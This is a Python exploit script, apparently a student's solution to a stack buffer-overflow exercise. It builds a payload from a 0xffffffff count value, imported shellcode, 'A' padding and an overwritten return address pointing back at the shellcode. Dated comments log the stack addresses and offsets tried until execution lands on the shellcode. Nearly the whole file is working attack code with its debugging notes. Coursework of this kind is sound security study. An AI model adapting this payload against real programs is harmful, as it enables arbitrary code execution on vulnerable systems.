from shellcode import shellcode
from struct import pack
import sys

# remember that values are put in backwards. \x01\x00\x00\x00 == 1
# what happens if the count is 0?
# what happens if count is really large?
	# it starts segfaulting at 0x001fa566
	

# addr of %ebp is once again 0xfffe7738 (but it ends up at 0xfffe7718)
# addr of buffer (shellcode) seems to be 0xff7fe150 (or 0xff7fe160)
# 0xfffe7738 - 0xff7fe160 (%ebp - buf[]) = 8295864

# NEW THOUGHT: what if we overwrite ret of read_elements instead?

# addr of %ebp starts at 0xfffe7718

#sys.stdout.buffer.write(pack("<I", 0x001fa565))	# count value
#sys.stdout.buffer.write(b"A"*8295845)

#sys.stdout.buffer.write(pack("<I", 0xffffffff))
#sys.stdout.buffer.write(b"A"* 17)

#sys.stdout.buffer.write(shellcode)


#-----------11/18-------------

# %ebp at 0xfffe7718
# buf[] at 0xfffe7708 (%ebp - 0x10)

sys.stdout.buffer.write(pack("<I", 0xffffffff))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"A"* 21)
sys.stdout.buffer.write(pack("<I", 0xfffe76f0))
# with this method, we see our shellcode right before ebp and the return address!
# surely we can add 4 more A's to overwrite ebp and put shellcode at ret?
# with 17 A's, shellcode is right before %ebp.
# with 18 A's, shellcode starts to leak into %ebp
# no, we segfault. with 21 A's, shellcode is at 0xfffe7706. ebp is 0xfffe7718

# actually, we should be putting shellcode first then overwriting ret to that addr
# if shellcode comes first, that is stored at 0xfffe76f0. bingo!
